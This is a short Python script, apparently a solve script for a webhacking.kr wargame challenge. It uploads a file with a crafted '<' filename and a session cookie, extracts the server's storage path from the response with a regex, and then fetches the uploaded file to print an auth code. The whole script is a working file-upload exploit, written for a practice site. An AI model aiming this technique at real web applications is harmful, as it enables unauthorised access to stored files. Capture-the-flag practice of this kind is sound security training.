import re
import requests

# 세션 값
PHPSESSID = ""
URL = "http://webhacking.kr/challenge/web/web-19/index.php"
KEY_NAME = 'passme'

files = {
    KEY_NAME: ('<', 'passme', 'application/octet-stream')
}

cookies = {
    'PHPSESSID': PHPSESSID
}

r = requests.post(URL, files = files, cookies = cookies)
p = r'\([^)]*\)'
c = re.compile(p)

matched = c.findall(r.text)

if matched is not None :
    requestUrl = URL.replace('index.php','') + matched[0].replace('(','').replace('/)','') + '/' + KEY_NAME

    response = requests.get(url = requestUrl)
    print('Here is your auth code : ' + response.text)
